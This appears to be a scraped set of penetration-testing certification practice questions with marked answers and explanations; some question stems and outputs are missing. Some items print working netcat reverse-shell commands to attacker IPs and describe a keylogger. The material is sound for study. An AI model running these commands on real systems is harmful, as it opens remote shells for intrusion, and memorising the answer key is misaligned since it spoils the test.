OBJ-4.2: Based on the question's wording, a compensating control would be most accurate for the given scenario. Compensating controls may be considered when an entity cannot meet a requirement explicitly, as stated due to legitimate technical or documented business constraints but has sufficiently mitigated the risk associated with the requirement by implementing other controls. Access requirements are a form of logical controls that can be implemented to protect a system and could be a form of compensating control if used appropriately. A policy is a statement of intent and is implemented as a procedure or protocol within an organization. An engineering tradeoff is a situational decision that involves diminishing or losing one quality, quantity, or property of a set or design in return for gains in other aspects. Often, an engineering tradeoff occurs when we trade security requirements for operational requirements or vice versa.

You have noticed some unusual network traffic outbound from a certain host. The host is communicating with a known malicious server over port 443 using an encrypted TLS tunnel. You ran a full system anti-virus scan of the host with an updated anti-virus signature file, but the anti-virus did not find any infection signs. Which of the following has MOST likely occurred?

- 

  Session hijacking

- 

  Password spraying

- 

  Directory traversal

- 

  Zero-day attack

  (正確)

#### 解釋

OBJ-4.2: Since you scanned the system with the latest anti-virus signatures and did not find any signs of infection, it would most likely be evidence of a zero-day attack. A zero-day attack has a clear sign of compromise (the web tunnel being established to a known malicious server). The anti-virus doesn’t have a signature yet for this particular malware variant. Password spraying occurs when an attacker tries to log in to multiple different user accounts with the same compromised password credentials. Session hijacking is exploiting a valid computer session to gain unauthorized access to information or services in a computer system. Based on the scenario, it doesn't appear to be session hijacking since the user would not normally attempt to connect to a malicious server. Directory traversal is an HTTP attack that allows attackers to access restricted directories and execute commands outside of the web server's root directory. A directory traversal is usually indicated by a dot dot slash (../) in the URL being attempted.

  Supply chain assessment

- 

  Privacy assessment

- 

  Quantitative risk assessment

- 

  Qualitative risk assessment

  (正確)

#### 解釋

OBJ-4.1: This describes a qualitative risk assessment since it categorizes things based on the likelihood and impact of a given incident using non-numerical terms, such as high, medium, and low. If the risk assessment provided exact numbers or percentages of risk, then it would be a quantitative risk assessment.

You are drafting the technical constraints for an upcoming penetration test. Which of the following would be a correct example of a technical constraint in a scoping document?

- 

  Spearphishing of employees is not allowed during this engagement

- 

  The legacy server may not be subject to a DoS or buffer overflow attack during this engagement

  (正確)

- 

  All findings must be kept confidential and only shared with the personnel listed in this agreement

- 

  Passive reconnaissance shall not be used during this engagement

#### 解釋

OBJ-1.2: A technical constraint is any item that is specifically excluded from the penetration test engagement. In general, these constraints will be technical in nature. For example, a legacy server may be considered too fragile to withstand denial of service or buffer overflow attacks. Other technical constraints may focus on the tools used based on the cost that would be involved. For example, it may be too costly to perform a USB key drop in the parking lot of a remote data center, so there may be a technical constraint to only allow remote attacks during the engagement.

You are currently conducting passive reconnaissance in preparation for an upcoming penetration test against Dion Training. Which of the following is LEAST likely to contain publicly available source-code from the targeted organization?

- 

  GitHub

- 

  Bitbucket

- 

  Reddit

  (正確)

- 

  SourceForge

#### 解釋

OBJ-2.1: Reddit is a social media website that provides posts separated into categories or forums. Reddit is useful when trying to build a social profile around a specific individual and is the least likely to contain source-code from the target organization. GitHub, Bitbucket, and SourceForge are public source-code repositories that allow developers to share code and collaborate. These source-code repositories are often used by commercial organizations and if they do not properly configure their privacy settings then their code can become public.

Samantha works in the human resource department in an open floorplan office. She is concerned about the possibility of someone conducting shoulder surfing to read sensitive information from employee files while accessing them on her computer. Which of the following physical security measures should she implement to protect against this threat?

- 

  Hardware token

- 

  Privacy screen

  (正確)

- 

  Badge reader

- 

  Biometric lock

#### 解釋

OBJ-3.6: A privacy screen is a filter placed on a monitor to decrease the viewing angle of a monitor. This prevents the monitor from being viewed from the side and can help prevent shoulder surfing. The standard type of anti-glare filter consists of a coating that reduces the reflection from a glass or plastic surface. A biometric lock is any lock that can be activated by biometric features, such as a fingerprint, voiceprint, or retina scan. Biometric locks make it more difficult for someone to counterfeit the key used to open the lock or a user’s account. A smart card is a form of hardware token. A smart card, chip card, or integrated circuit card is a physical, electronic authorization device used to control access to a resource. It is typically a plastic credit card-sized card with an embedded integrated circuit chip. In high-security environments, employee badges may contain a smart card embedded chip that must be inserted into a smart card reader to log in or access information on the system. A badge reader is used to read an employee's identification badge using a magnetic stripe, barcode, or embedded RFID chip.

Which of the following type of threats did the Stuxnet attack rely on to cross an air gap between a business and an industrial control system network?

- 

  Cross-site scripting

- 

  Removable media

  (正確)

- 

  Directory traversal

- 

  Session hijacking

#### 解釋

OBJ-3.6: Air gaps are designed to remove connections between two networks to create a physical segmentation between them. The only way to cross an air gap is to have a physical device between these systems, such as using a removable media device to transfer files between them. A directory traversal is an HTTP attack that allows attackers to access restricted directories and execute commands outside of the web server's root directory. Cross-Site Scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. A session hijacking attack compromises the session token by stealing or predicting a valid session token to gain unauthorized access to the Web Server. A directory traversal, cross-site scripting, or session hijacking attack cannot by itself cross an air gap.

Which of the following commands should be run on a victim's system to connect to a reverse shell?

- 

  nc 192.168.1.53 31337 –e /bin/sh

  (正確)

- 

  nc 192.168.1.53 31337

- 

  nc -lp 31337 -e /bin/sh

- 

  nc -lp 31337

#### 解釋

OBJ-3.7: A reverse shell is established when the target machines communicate with an attack machine listening on a specific port. To set up a listener on the attack machine, you would use the command "nc -lp 31337" on it. To connect to the attacking machine from the victim machine, you would enter the command "nc 192.168.1.53 31337 –e /bin/sh" on it. A bind shell is established when a victim system "binds" its shell to a local network port. To achieve this using netcat, you should execute the command "nc -lp 31337 -e /bin/sh" on the victim machine. This sets up a listener on the machine on port 31337 and will execute the /bin/sh when another machine connects to its listener on port 31337. The attacker would enter the command "nc 192.168.1.53 31337" to connect to the victim's bind shell.

You are conducting a social engineering attack against an organization as part of an engagement. You spoof your caller ID to appear to be from within the company, then you call up the company and ask to speak with the CIO's assistant. When they answer the phone, you tell them that you are from the IT department and that you detected a malicious intruder has taken over their account and is encrypting data all over the next. You offer to help them stop the attack quickly, but they first need to give you their password. The victim says they won't give that information to your over the phone, to which you respond, "Ok, fine, but when the boss finds out that you could have stopped this attack and chose to ignore me, don't say I didn't warn you." What type of social engineering principle is being exploited here?

- 

  Fear

  (正確)

- 

  Scarcity

- 

  Trust

- 

  Authority

#### 解釋

OBJ-3.6: Fear is a visceral emotion that can motivate people to act in ways they normally would not. In this scenario, the social engineer tries to convince the victim that their actions must be taken immediately, or bad consequences might occur. This is an attempt to cause fear and anxiety in the victim to hand over their password. Authority is used to take advantage of people's willingness to act when directed to by someone with the power or right to give orders. For example, an attacker may pose as a police officer, government agent, or high-level executive to force an employee to take some form of action, whether it is ethically dubious or counter to their interests. Scarcity is used to create a fear in a person of missing out on a special deal or offer. This technique is used in advertising all the time, such as "supplies are limited," "only available for the next 4 hours", and other such artificial limitations being used.

Alex is conducting a penetration test of Dion Training's network. Alex wants to establish a reverse shell from the target to his attack workstation. His attack workstation has a netcat listener setup on port 52154 and has a public IP address of 45.58.12.123. Which of the following commands would Alex issue on the target host to create a reverse shell using netcat?

- 

  nc -lp 52154 -e /bin/sh

- 

  nc 45.58.12.123 52154 -e /bin/sh

  (正確)

- 

  nc -lp 52154 /bin/sh

- 

  nc 45.58.12.123 52154 /bin/sh

#### 解釋

OBJ-3.7: A reverse shell is a shell initiated from the target host back to the attacker's workstation that puts the target into a listening state to capture the shell. A reverse shell is commonly used to avoid detection and bypass firewalls located at the targeted organization. Netcat (nc) is an open-source networking utility for debugging and investigating the network, and that can be used to create TCP/UDP connections and investigate them. It is extremely popular with penetration testers and attackers alike due to its multiple use cases. You should be familiar with setting up a listener and establishing a connection to the listener using netcat. Using the -lp option sets up a listener on the machine using the port specified (52154 in this scenario). To start the connection to the listener, you would enter "nc <IPADDR> <PORT> -e <SHELL>" substituting the details for each parameter in each set of brackets.

Which of the following phase of a penetration test are not usually conducted by a real attacker?

- 

  Covering tracks

- 

  Gaining access

- 

  Reconnaissance

- 

  Reporting

  (正確)

#### 解釋

OBJ-1.2: While a penetration test closely mirrors the same attack process used by a real attacker, the reporting phase is used only by penetration testers. The reporting phase is where the information gathered during testing and analysis is shared with stakeholders. Normally, this includes the vulnerabilities detected, vulnerabilities exploited, sensitive data accessed, length of access maintained, and recommendations for remediation. A penetration tester will conduct four phases in the assessment: planning, discovery, attack, and reporting. An attacker will not conduct reporting. Reconnaissance occurs during the discovery phase while gaining access and covering tracks occurs during the attack phase.

What type of assessment seeks to validate a systems security posture against a particular checklist?

- 

  Goal-based

- 

  Objective-based

- 

  Compliance-based

  (正確)

- 

  Red Team

#### 解釋

OBJ-1.1: Compliance-based assessments seek to validate a system against a given checklist. This could validate organizational policies, be risk-based, or be used to validate PCI-DSS compliance. Objective-based penetration testing approaches an objective from all angles to ensure that information remains secure. This testing more accurately simulates the attacks launched by a malicious party. Goal-based assessments use goals defined before the assessment begins, and the penetration tester works to achieve the goals. Once a goal is achieved, the penetration testers should determine how many unique ways the goal can be achieved. A red team is a group that helps organizations to improve themselves by providing opposition to the point of view of the organization that they are helping.

  apache_log

- 

  httpd_log

- 

  http_log

- 

  access_log

  (正確)

#### 解釋

OBJ-2.3: On Apache web servers, the logs are stored in a file named access_log. By default, the file can be located at /var/log/httpd/access_log. This file records all requests processed by the Apache server. The WebSphere Application Server uses the httpd_log file for z/OS, which is a very outdated server from the early 2000s. The http_log file is a header class file in C used by the Apache web server's pre-compiled code that provides the logging library but does not contain any actual logs itself. The file called apache_log is an executable program that parses Apache log files within in Postgres database.

DeepScan supports data-flow analysis and understands the execution flow of a program. It allows you to see possible security flaws without executing the code. Which of the following types of tools would DeepScan be classified as?

- 

  Decompiler

- 

  Fault injector

- 

  Static code analyzer

  (正確)

- 

  Fuzzer

#### 解釋

OBJ-4.2: DeepScan is an example of a static code analysis tool. It inspects the code for possible errors and issues without actually running the code. Fuzzing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program through a fuzzer. A decompiler is a computer program that takes an executable file as input and attempts to create a high-level source file that can be recompiled successfully. Fault injection is a testing technique that aids in understanding how a system behaves when stressed in unusual ways. A fuzzer, decompiler, and fault injector are all dynamic analysis tools because they require the program to be run during testing and analysis.

- 

  Vishing

- 

  Spear phishing

  (正確)

- 

  Whaling

- 

  Phishing

#### 解釋

OBJ-3.6: Spear phishing is the fraudulent practice of sending emails from a seemingly known or trusted sender to induce targeted individuals to reveal confidential information. The key to answering this question is that the attack was focused on a targeted set of people, not just an indiscriminate large group of random people. Phishing is an email-based social engineering attack in which the attacker sends an email from a supposedly reputable source, such as a bank, to try to elicit private information from the victim. Whaling is an email-based or web-based form of phishing that targets senior executives or wealthy individuals. Vishing is a social-engineering attack where the attacker extracts information while speaking over the phone or leveraging IP-based voice messaging services (VoIP).

A cybersecurity analyst is working at a college that wants to increase its network's security by implementing vulnerability scans of centrally managed workstations, student laptops, and faculty laptops. Any proposed solution must scale up and down as new students and faculty use the network. Additionally, the analyst wants to minimize the number of false positives to ensure accuracy in their results. The chosen solution must also be centrally managed through an enterprise console. Which of the following scanning topologies would be BEST able to meet these requirements?

- 

  Combination of cloud-based and server-based scanning engines

- 

  Combination of server-based and agent-based scanning engines

- 

  Active scanning engine installed on the enterprise console

  (正確)

- 

  Passive scanning engine located at the core of the network infrastructure

#### 解釋

OBJ-2.4: Since the college wants to ensure a centrally-managed enterprise console, an active scanning engine installed on the enterprise console would best meet these requirements. The college’s cybersecurity analysts could then perform scans on any devices connected to the network using the active scanning engine at the desired intervals. Agent-based scanning would be ineffective since the college cannot force the agents' installation onto each of the personally owned devices brought in by the students or faculty. A cloud-based or server-based engine may be useful, but it won't address the centrally-managed requirement. Passive scanning is less intrusive but is subject to a high number of false positives.

A company has had several virus infections over the past few months. The root cause was determined to be known vulnerabilities in the software applications in use by the company. What should an administrator implement to prevent future outbreaks?

- 

  Acceptable use policies

- 

  Incident response team

- 

  Host-based intrusion detection systems

- 

  Patch management

  (正確)

#### 解釋

OBJ-4.1: Since the viruses exploited known vulnerabilities, there should be patches available from the manufacturer/vendor. Patch management is the process of distributing and applying updates to the software to prevent vulnerabilities from being exploited by an attacker or malware. Proper patch management is a technical control that would prevent future outbreaks. An acceptable use policy (AUP) is a document stipulating constraints and practices that a user must agree to for access to a corporate network or the Internet. While some items in the AUP might help prevent a malware infection (such as not allowing users to download and run programs from the internet), it is considered an administrative control, and choosing a technical control like patch management would better protect the network. An incident response team or emergency response team is a group of people who prepare for and respond to any emergency incident, such as a natural disaster or an interruption of business operations. An incident response team will respond to the virus infections, but they would not prevent them from occurring. Host-based intrusion detection systems (HIDS) help organizations to identify threats inside the network perimeter by monitoring host devices for malicious activity that, if left undetected, could lead to serious breaches. A HIDS may detect the effects of a virus infection, such as a client becoming a zombie in a botnet, but it will not prevent these outbreaks from occurring.

- 

  Call the CTO's assistant using a pretext to gather information about their schedule

  (正確)

- 

  Send a text message with a malicious link to the organization's executives

#### 解釋

OBJ-3.6: Pretexting is a social engineering tactic where a team will communicate, whether directly or indirectly, a lie or half-truth to get someone to believe a falsehood. Vishing is a social-engineering attack where the attacker extracts information while speaking over the phone or leveraging IP-based voice messaging services (VoIP). Smishing (SMS phishing) is a phishing attack in which the attacker entices their victim through SMS text messages. If the messages are sent by text message, then the attack is considered smishing. Spear phishing is the fraudulent practice of sending emails from a seemingly known or trusted sender to induce targeted individuals to reveal confidential information. Spear phishing attacks focus on a targeted set of people, not just an indiscriminate large group of random people. Whaling is an email-based or web-based form of phishing that targets senior executives or wealthy individuals.

OBJ-2.2: A robots.txt file tells search engine crawlers which URLs the crawler should index and access on your site. When conducting active reconnaissance, you may wish to manually evaluate the robots.txt file and then access those portions of the website. The certificate revocation list (CRL) is a list of digital certificates that have been revoked before their expiration date and are now considered invalid. A certificate signing request (CSR) is a Base64 ASCII file generated on the device that needs a certificate and contains information that the certificate authority needs to create the certificate. Subject alternative name (SAN) is a field in a digital certificate that allows a host to be identified by multiple host names or domain names. Certificates that use a SAN are referred to as a multi-domain certificate.

#### 解釋

OBJ-3.7: A reverse shell is established when the target machine communicates with an attack machine that is listening on a specific port. Reverse shells are effective in bypassing firewalls, port filtering, and network address translations, unlike a bind shell. A bind shell allows a target system to bind its shell to a local network port and accept inbound connections. Bind shells may be blocked by a firewall filtering incoming traffic on the given port, though. A trojan is a malicious software program hidden within an innocuous-seeming piece of software. Usually, the Trojan is used to try to compromise the security of the target computer. A daemon is used on Linux systems to act as a service that runs in the background without being attached to a terminal.

A new alert has been distributed throughout the information security community regarding a critical Apache vulnerability. What action could you take to ONLY identify the known vulnerability?

- 

  Perform an unauthenticated vulnerability scan on all servers in the environment

- 

  Perform a scan for the specific vulnerability on all web servers

  (正確)

- 

  Perform a web vulnerability scan on all servers in the environment

- 

  Perform an authenticated scan on all web servers in the environment

#### 解釋

OBJ-2.4: Since you wish to check for only the known vulnerability, you should scan for that specific vulnerability on all web servers. All web servers are chosen because Apache is a web server application. While performing an authenticated scan of all web servers or performing a web vulnerability scan of all servers would also find these vulnerabilities, it is a much larger scope. It would waste time and processing power by conducting these scans instead of properly scoping the scans based on your needs. Performing unauthenticated vulnerability scans on all servers is also too large in scope (all servers) while also being less effective (unauthenticated scan).

Based on the output above, which of the following types of vulnerabilities does this Windows system contain?

- 

  Writeable services

- 

  Unsecure file/folder permissions

- 

  Clear text credentials in LDAP

- 

  Unquoted service path

  (正確)

#### 解釋

OBJ-3.7: This Windows machine contains an unquoted service path vulnerability, as shown in the output. If a service is created with an executable path that contains spaces and is not enclosed within quotes, then an unquoted service path vulnerability exists. In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument. If the service involved has SYSTEM privileges, an attacker could exploit this vulnerability and gain SYSTEM level access. This command finds the service name, executable path, the display name of the service, and auto starts in all the directories except C:\Windows\ (since by default there is no such service that has spaces and is unquoted in this folder). As shown in the output, the service called "VulnerableService" has an unquoted service path.

  orng

- 

  iTin

  (正確)

- 

  m.ia

#### 解釋

OBJ-5.2: When evaluating the code s[1:12:3], you would receive "iTin" in response. Within Python, characters in a string can be accessed by their index location. If the string (s) is "DionTraining.com", then each letter from left to right is referenced as s[0] to s[15]. For example, if you enter s[5], you would receive the letter "r" in response. The format for the array is [start:end:increment], so s[1:12:3] is evaluated as starting with the 1st position (i in Dion since computers start counting at 0), count by three until you reach the 12th position (. In DionTraining.com). This would display the 1st position (i), 4th position (T), 7th position (i), 10th position (n), and then stop. This is because the command said to stop at the 12th position, but our next position to display would have been 13 when incrementing by 3 each time.

Your company failed a recent security audit. The IT Directory has issued a new policy dictating that all workstations must be locked when not in use for more than 2 minutes. A password must be entered before booting up the operating system, and that the hard drive is fully encrypted. You have been asked to configure the corporate workstations to enforce these new security measures. Which THREE of the following should you configure FIRST?

- 

  Enable a screen lock

  (正確)

- 

  Enable strong passwords

- 

  Require multifactor authentication

- 

  Enable a UEFI password

  (正確)

- 

  Require the use of smart cards

- 

  Enable BitLocker

  (正確)

#### 解釋

OBJ-4.2: These requirements can be met by enabling BitLocker to encrypt the hard drive, enabling a UEFI password to require a password to be entered before booting an operating system, and enabling a screen lock that turns on after 2 minutes of inactivity. While the use of strong passwords, smart cards, or multifactor authentication is beneficial, they alone will not meet the requirements outlined in this scenario.

Dion Training wants to implement DNS protection on their mobile devices. Which of the following implementations would allow the device to use a specified DNS provider to block dangerous sites by refusing to resolve previously identified malicious hosts?

- 

  Custom DNS

  (正確)

- 

  Profiles

- 

  DoH

- 

  Token-based access

#### 解釋

OBJ-4.2: Custom DNS is often used to block dangerous sites by purposefully refusing to resolve to a previously identified malicious host. DNS over HTTPS (DoH) allows the DNS requests to be tunneled within the TLS traffic over port 443. This allows most of the DNS protocol traffic over port 53 to be eliminated after the first DNS request to the DoH provider is made. DoH is used mainly to provide privacy protections for the user and their web browsing activities. Device configuration profiles are XML files that contain configuration details defined at either the user or device level. These profiles can be manually installed or automatically deployed through an MDM solution. Token-based access requires an enrolled device to provide a token issued by an IAM solution to gain access to network resources. Mobile devices with an installed token are granted access to the network resources after being verified by a network access control (NAC) appliance.

A penetration tester has exploited an FTP server using Metasploit and now wants to pivot to the organization's LAN. What is the best method for the penetration tester to use to conduct the pivot?

- 

  Issue the pivot exploit and setup meterpreter

- 

  Reconfigure the network settings in meterpreter

- 

  Set the payload to propagate through meterpreter

- 

  Create a route statement in meterpreter

  (正確)

#### 解釋

OBJ-3.1: Since the penetration tester has exploited the FTP server from outside the LAN, they will need to set up a route statement in meterpreter. Metasploit makes this very simple since it also has an autoroute meterpreter script that will allow us to attack this second network through our first compromised machine (the FTP server) and then create the routes needed.

- 

  Debugging an exploit

- 

  Collecting logs

- 

  Scheduling tasks

- 

  Keylogging

  (正確)

#### 解釋

OBJ-5.2: This simple Python script is only 11 lines in length, but it creates an effective keylogger. The function (OnKeyboardEvent) is defined to log any ASCII characters receive on the keyboard of the user's computer. It will save all of this information to a file in the C:\Windows\Temp\ directory for later exfiltration by the penetration tester.

You are working as part of a penetration testing team targeting Dion Training's Linux-based network. You want to determine if you can crack the password on their remote authentication servers. Which of the following tools should you use?

- 

  CeWL

- 

  Medusa

  (正確)

- 

  W3AF

- 

  Mimikatz

#### 解釋

OBJ-5.3: Medusa is a command-line-based free password cracking tool often used in brute force password attacks on remote authentication servers. W3AF (Web Application Attack and Audit Framework) is a Python tool included in Kali Linux that tries to identify and exploit any web app vulnerabilities. CeWL is a ruby app that crawls websites to generate word lists for use with other password crackers. Mimikatz is an open-source tool that enables you to view credential information stored on Microsoft Windows computers.

You have been hired to conduct a compliance-based, external network penetration test for an organization. During the engagement planning, you determined that the client has an IPS protecting their network and your team has spent 1 week already trying to bypass it. Since you only have 1 week left in the assessment, you have requested to have your source IP added to the allow list in the IPS during the engagement. The client states that they do not want to add you to their allow list since the IPS is properly blocking you as an attacker. Which of the following should you tell the client?

- 

  The organization cannot rely solely on the IPS because its signatures need to be constantly updated to prevent vulnerabilities and exploitation.

- 

  Adding the source IP to the allow list is required since a third-party developed the IPS and, therefore, would need to approve the penetration test if the IP is not added to the allow list.

- 

  The source IP must be added to the allow list to prevent flooding the IPS and Syslog server with false positives during the engagement.

- 

  Adding the source IP to the allow list will allow the penetration testers to focus on the discovery of security issues within the systems instead of relying solely on the effectiveness of the IPS.

  (正確)

#### 解釋

OBJ-4.3: If the source IP is not added to the allow list, the penetration tester will waste a lot of time and resources trying to bypass it before testing the rest of the systems in the assessment's scope. Instead, the client should add the source IP to the allow list so the penetration testers can focus on other vulnerabilities before this perimeter device. When drafting the final report, the penetration tester should indicate which discovered vulnerabilities would be a lower risk due to the IPS already being installed and working as a mitigating control.

In 2014, Apple's implementation of SSL had a severe vulnerability that, when exploited, allowed an attacker to gain a privileged network position that would allow them to capture or modify data in an SSL/TLS session. This was caused by poor programming in which a failed check of the connection would exit the function too early. Based on this description, what is this an example of?

- 

  Insufficient logging and monitoring

- 

  Use of insecure functions

- 

  Improper error handling

  (正確)

- 

  Insecure object reference

#### 解釋

OBJ-3.3: This is an example of an improper error handling vulnerability. A well-written application must be able to handle errors and exceptions gracefully. The main goal must be for the application not to fail and allow the attacker to execute code or perform an injection attack. One famous example of an improper error handling vulnerability is Apple's GoTo bug, as described above. For more details on this particular vulnerability, please see CVE-2014-1266. Insecure object reference refers to when a reference to an internal implementation object, such as a file or database key, is exposed to users without any other access control. Insufficient logging and monitoring allow attackers to achieve their goals without being detected due to the lack of monitoring and timely response by defenders. The use of insecure functions occurs in the C language when legacy functions like strcpy() are used. These insecure functions can lead to buffer overflow and other exploits being successful against a program.

Jason is conducting a penetration test against an organization's Windows network. This engagement aims to demonstrate what a trusted insider could do to the organization's network. The organization provided Jason with a corporate laptop and a standard user account as an entry-level employee.

Based on the output above, which of the following types of vulnerabilities was exploited?

- 

  Writeable services

- 

  Unquoted service paths

- 

  Insecure sudo

- 

  Insecure file/folder permissions

  (正確)

#### 解釋

OBJ-3.7: In this example, Jason used the accesschk program to determine which folders had write access within the Windows directory. When he found three that had insecure file/folder permissions, he copied his exploit to that folder (c:\Windows\Branding) and then attempted to run it from that location. Based on the results, it appears he was successful. This is likely due to the system administrator only allowing trusted programs to run from the Desktop.

A hacker successfully modified the sale price of items purchased through your company's website. During the investigation that followed, the security analyst has verified the web server, and the Oracle database was not compromised directly. The analyst also found no attacks that could have caused this during their log verification of the Intrusion Detection System (IDS). What is the most likely method that the attacker used to change the items' sale price?

- 

  Cross-site scripting

- 

  SQL injection

- 

  Changing hidden form values

  (正確)

- 

  Buffer overflow attack

#### 解釋

OBJ-3.3: Since there are no indications in the IDS logs, the database, or the server, it is most likely that the hacker changed hidden form values to change the items' price in the shopping cart. A buffer overflow is an anomaly that occurs when a program overruns the buffer's boundary and overwrites adjacent memory locations while writing data to a buffer. Cross-Site Scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in a browser side script, to a different end-user. SQL injection is a code injection technique used to attack data-driven applications. Malicious SQL statements are inserted into an entry field for execution, such as dumping the database contents to the attacker.

Lamont is in the process of debugging a software program. As he examines the code, he discovers that it is miswritten. Due to the error, the code does not validate a variable's size before allowing the information to be written into memory. Based on Lamont’s discovery, what type of attack might occur?

- 

  Malicious logic

- 

  SQL injection

- 

  Buffer overflow

  (正確)

- 

  Cross-site scripting

#### 解釋

OBJ-5.1: A buffer overflow occurs when a program or process tries to store more data in a buffer (temporary data storage area) than it was intended to hold. Since buffers are created to contain a finite amount of data, the extra information can cause an overflow into adjacent buffers, corrupting or overwriting the valid data held in them. Although it may occur accidentally through programming error, buffer overflow is an increasingly common security attack on data integrity. In buffer overflow attacks, the extra data may contain codes designed to trigger specific actions, in effect sending new instructions to the attacked computer that could, for example, damage the user's files, change data, or disclose confidential information. Programs should use the variable size validation before writing the data to memory to ensure that the variable can fit into the buffer to prevent this type of attack.
